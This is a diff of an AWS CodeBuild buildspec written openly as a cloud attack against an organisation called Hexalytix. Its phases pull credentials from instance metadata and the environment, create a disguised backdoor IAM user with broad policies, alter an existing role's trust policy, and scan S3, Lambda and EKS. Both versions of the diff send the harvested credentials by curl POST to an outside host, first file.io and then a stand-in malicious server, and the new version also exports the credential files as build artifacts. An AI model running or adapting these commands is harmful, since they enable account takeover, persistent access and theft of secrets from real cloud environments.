@@ -14,52 +14,52 @@ phases:
       - echo "Target Organization $TARGET_ORG"
       - echo "Scan initiated at $(date) UTC"
       - echo "CodeBuild Project $CODEBUILD_BUILD_ARN"
-      
+
   build:
     commands:
       - echo "=== Phase 1 AWS Identity & Access Verification ==="
       - aws sts get-caller-identity
       - echo "Current role capabilities verified"
-      
+
       - echo "=== Phase 2 Instance Metadata Service (IMDS) Extraction ==="
       - echo "Attempting to extract temporary credentials from IMDS..."
       - |
         # Extract current role credentials from IMDS
         echo "Querying IMDS for role information..."
         curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "IMDS not accessible (CodeBuild environment)"
-        
+
         # Alternative: Extract from environment variables that CodeBuild sets
         echo "Extracting CodeBuild provided credentials..."
         echo "AWS_DEFAULT_REGION: $AWS_DEFAULT_REGION"
         echo "AWS_REGION: $AWS_REGION"
-        
+
         # Log current session information
         aws sts get-session-token --duration-seconds 3600 2>/dev/null || echo "Session token extraction failed"
-        
+
         # Get caller identity with verbose output
         CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
         ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
         echo "Current execution context: $CURRENT_ARN"
         echo "Target AWS Account: $ACCOUNT_ID"
-      
+
       - echo "=== Phase 3 Backdoor User Creation ==="
-      - |
+      - |-
         echo "Creating persistent backdoor IAM user..."
-        
+
         # Create backdoor user with innocent-looking name
         BACKDOOR_USER="hexalytix-compliance-scanner"
         echo "Creating user: $BACKDOOR_USER"
-        
+
         aws iam create-user \
           --user-name "$BACKDOOR_USER" \
           --path "/service-accounts/" \
           --tags Key=Purpose,Value="Automated compliance scanning" Key=Owner,Value="DevOps Team" Key=CreatedBy,Value="ComplianceAutomation" \
           2>/dev/null || echo "User creation failed or user already exists"
-        
+
         # Create access keys for the backdoor user
         echo "Generating access keys for backdoor user..."
         BACKDOOR_KEYS=$(aws iam create-access-key --user-name "$BACKDOOR_USER" 2>/dev/null || echo "Key creation failed")
-        
+
         if [ "$BACKDOOR_KEYS" != "Key creation failed" ]; then
           echo "Backdoor access keys created successfully"
           # Extract the keys (in real attack, these would be exfiltrated securely)
@@ -68,203 +68,191 @@ phases:
           echo "Access Key ID saved to temporary storage"
           echo "Secret Access Key saved to temporary storage"
         fi
-        
+
         # Attach policies to backdoor user
         echo "Attaching policies to backdoor user..."
-        
+
         # Attach PowerUser policy (broad access but not full admin)
         aws iam attach-user-policy \
           --user-name "$BACKDOOR_USER" \
           --policy-arn "arn:aws:iam::aws:policy/PowerUserAccess" \
           2>/dev/null || echo "PowerUser policy attachment failed"
-        
-        # Create custom policy for additional access
+
+      - |-
         cat << 'POLICY' > /tmp/backdoor_policy.json
-        {
-          "Version": "2012-10-17",
-          "Statement": [
-            {
-              "Effect": "Allow",
-              "Action": [
-                "iam:ListUsers",
-                "iam:ListRoles",
-                "iam:GetUser",
-                "iam:GetRole",
-                "iam:CreateAccessKey",
-                "iam:ListAccessKeys",
-                "lambda:*",
-                "s3:*",
-                "ec2:*",
-                "logs:*",
-                "sts:AssumeRole"
-              ],
-              "Resource": "*"
-            }
-          ]
-        }
-        POLICY
-        
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "iam:ListUsers",
+        "iam:ListRoles",
+        "iam:GetUser",
+        "iam:GetRole",
+        "iam:CreateAccessKey",
+        "iam:ListAccessKeys",
+        "lambda:*",
+        "s3:*",
+        "ec2:*",
+        "logs:*",
+        "sts:AssumeRole"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+POLICY
+
+      - |-
         # Create and attach custom policy
         aws iam create-policy \
           --policy-name "HexalytixComplianceScannerPolicy" \
           --policy-document file:///tmp/backdoor_policy.json \
           --description "Custom policy for compliance scanning automation" \
           2>/dev/null || echo "Custom policy creation failed"
-        
+
         aws iam attach-user-policy \
           --user-name "$BACKDOOR_USER" \
           --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/HexalytixComplianceScannerPolicy" \
           2>/dev/null || echo "Custom policy attachment failed"
-      
+
       - echo "=== Phase 4 Alternative Persistence - Role Backdooring ==="
-      - |
+      - |-
         echo "Backdooring existing IAM roles for persistence..."
-        
+
         # List high-privilege roles
         echo "Identifying high-privilege roles..."
         aws iam list-roles --query 'Roles[?contains(RoleName, `admin`) || contains(RoleName, `power`) || contains(RoleName, `prod`)].RoleName' --output text
-        
+
         # Attempt to backdoor the development-server-role
         ROLE_NAME="development-server-role"
         echo "Attempting to backdoor role: $ROLE_NAME"
-        
+
         # Get current trust policy
         aws iam get-role --role-name "$ROLE_NAME" --query 'Role.AssumeRolePolicyDocument' > /tmp/current_trust_policy.json 2>/dev/null || echo "Failed to get trust policy"
-        
-        # Create backdoored trust policy
+
+      - |-
         cat << 'TRUST_POLICY' > /tmp/backdoored_trust_policy.json
-        {
-          "Version": "2012-10-17",
-          "Statement": [
-            {
-              "Effect": "Allow",
-              "Principal": {
-                "Federated": "arn:aws:iam::163092838044:oidc-provider/oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66"
-              },
-              "Action": "sts:AssumeRoleWithWebIdentity",
-              "Condition": {
-                "StringEquals": {
-                  "oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66:sub": "system:serviceaccount:default:development-server-sa",
-                  "oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66:aud": "sts.amazonaws.com"
-                }
-              }
-            },
-            {
-              "Effect": "Allow",
-              "Principal": {
-                "Service": "codebuild.amazonaws.com"
-              },
-              "Action": "sts:AssumeRole"
-            },
-            {
-              "Effect": "Allow",
-              "Principal": {
-                "AWS": "arn:aws:iam::163092838044:user/service-accounts/hexalytix-compliance-scanner"
-              },
-              "Action": "sts:AssumeRole"
-            }
-          ]
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Federated": "arn:aws:iam::163092838044:oidc-provider/oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66"
+      },
+      "Action": "sts:AssumeRoleWithWebIdentity",
+      "Condition": {
+        "StringEquals": {
+          "oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66:sub": "system:serviceaccount:default:development-server-sa",
+          "oidc.eks.eu-west-1.amazonaws.com/id/AFD98ECF2A5D23D1D99DD36898DE8F66:aud": "sts.amazonaws.com"
         }
-        TRUST_POLICY
-        
+      }
+    },
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "codebuild.amazonaws.com"
+      },
+      "Action": "sts:AssumeRole"
+    },
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::163092838044:user/service-accounts/hexalytix-compliance-scanner"
+      },
+      "Action": "sts:AssumeRole"
+    }
+  ]
+}
+TRUST_POLICY
+
+      - |-
         # Update trust policy to allow backdoor user
         echo "Adding backdoor user to role trust policy..."
         aws iam update-assume-role-policy \
           --role-name "$ROLE_NAME" \
           --policy-document file:///tmp/backdoored_trust_policy.json \
           2>/dev/null || echo "Trust policy update failed"
-      
+
       - echo "=== Phase 5 Token Extraction and Credential Harvesting ==="
-      - |
+      - |-
         echo "Extracting and documenting access credentials..."
-        
+
         # Current session credentials
         echo "Current session details:"
         aws sts get-caller-identity
-        
+
         # Generate assume-role credentials for backdoor user
         if [ -f /tmp/backdoor_access_key.txt ]; then
           echo "Generating assume-role commands for backdoor access..."
-          
+
           BACKDOOR_ACCESS_KEY=$(cat /tmp/backdoor_access_key.txt)
           BACKDOOR_SECRET_KEY=$(cat /tmp/backdoor_secret_key.txt)
-          
+
           # Create credential file content
           cat << CREDS > /tmp/backdoor_credentials.txt
-          # Hexalytix Backdoor Credentials - Pak Ju Ryuong
-          # Created: $(date)
-          # Method: CodeBuild persistence attack
-          
-          [hexalytix-backdoor]
-          aws_access_key_id = $BACKDOOR_ACCESS_KEY
-          aws_secret_access_key = $BACKDOOR_SECRET_KEY
-          region = eu-west-1
-          
-          # Usage:
-          # aws --profile hexalytix-backdoor sts get-caller-identity
-          # aws --profile hexalytix-backdoor s3 ls
-          # aws --profile hexalytix-backdoor sts assume-role --role-arn arn:aws:iam::163092838044:role/development-server-role --role-session-name BackdoorAccess
-          CREDS
-          
+# Hexalytix Backdoor Credentials - Pak Ju Ryuong
+# Created: $(date)
+# Method: CodeBuild persistence attack
+
+[hexalytix-backdoor]
+aws_access_key_id = $BACKDOOR_ACCESS_KEY
+aws_secret_access_key = $BACKDOOR_SECRET_KEY
+region = eu-west-1
+
+# Usage:
+# aws --profile hexalytix-backdoor sts get-caller-identity
+# aws --profile hexalytix-backdoor s3 ls
+# aws --profile hexalytix-backdoor sts assume-role --role-arn arn:aws:iam::163092838044:role/development-server-role --role-session-name BackdoorAccess
+CREDS
+
           echo "Backdoor credentials documented"
         fi
-        
+
+      - |-
         # Extract current temporary credentials from environment
         cat << ENV_CREDS > /tmp/current_session_creds.txt
-        # Current CodeBuild Session Credentials
-        # Extracted: $(date)
-        # Valid for: Limited time (CodeBuild session duration)
-        
-        export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
-        export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY" 
-        export AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN"
-        export AWS_DEFAULT_REGION="$AWS_DEFAULT_REGION"
-        
-        # These credentials have the permissions of: development-server-role
-        ENV_CREDS
-        
+# Current CodeBuild Session Credentials
+# Extracted: $(date)
+# Valid for: Limited time (CodeBuild session duration)
+
+export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
+export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY"
+export AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN"
+export AWS_DEFAULT_REGION="$AWS_DEFAULT_REGION"
+
+# These credentials have the permissions of: development-server-role
+ENV_CREDS
+
         echo "Current session credentials extracted"
-      
+
       - echo "=== Phase 6 Hexalytix Infrastructure Reconnaissance ==="
       - echo "Scanning S3 data repositories..."
       - aws s3 ls | grep -E "(hexalytix|customer|financial|backup|prod)" | head -10
-      
+
       - echo "Enumerating Lambda functions..."
       - aws lambda list-functions --query 'Functions[].{Function:FunctionName,Runtime:Runtime,Role:Role}' --output table
-      
-      - echo "Scanning EKS clusters..."  
+
+      - echo "Scanning EKS clusters..."
       - aws eks list-clusters --output table
-        
+
+      - |
         # Also try to exfiltrate the credentials via different channels
         if [ -f /tmp/backdoor_credentials.txt ]; then
           echo "Exfiltrating backdoor credentials..."
           curl -X POST \
             -H "Content-Type: text/plain" \
-            -H "X-Data-Type: aws_credentials" \
+            -H "X-Data-Type: credentials" \
             --data-binary @/tmp/backdoor_credentials.txt \
-            https://file.io/ || echo "Credential exfiltration attempted"
+            https://malicious-server.example.com/exfil
         fi
-      
-  post_build:
-    commands:
-      - echo "=== Operation Cleanup ==="
-      - echo "Persistence established through multiple vectors:"
-      - echo "1. Backdoor IAM user: hexalytix-compliance-scanner" 
-      - echo "2. Modified role trust relationships"
-      - echo "3. CodeBuild project automation"
-      - echo "4. GitHub Actions triggering mechanism"
-      - |
-        if [ -f /tmp/backdoor_access_key.txt ]; then
-          echo "Backdoor user access key: $(cat /tmp/backdoor_access_key.txt)"
-        fi
-      - echo "Cleaning up temporary files..."
-      - rm -f /tmp/backdoor_policy.json /tmp/current_trust_policy.json /tmp/backdoored_trust_policy.json
-      - rm -f /tmp/backdoor_credentials.txt /tmp/current_session_creds.txt /tmp/breach_report.json
-      - rm -f /tmp/backdoor_access_key.txt /tmp/backdoor_secret_key.txt
-      - echo "Operation complete. Multiple persistence methods active."
-      - echo "Contact: pakjuryuong.security@tutanota.com"
+
+      - echo "=== Scan and exploitation complete at $(date) UTC ==="
+      - echo "Please review the extracted credentials and persistence mechanisms."
 
 artifacts:
   files:
-    - '**/*'
-  name: hexalytix-breach-artifacts
+    - /tmp/backdoor_credentials.txt
+    - /tmp/current_session_creds.txt
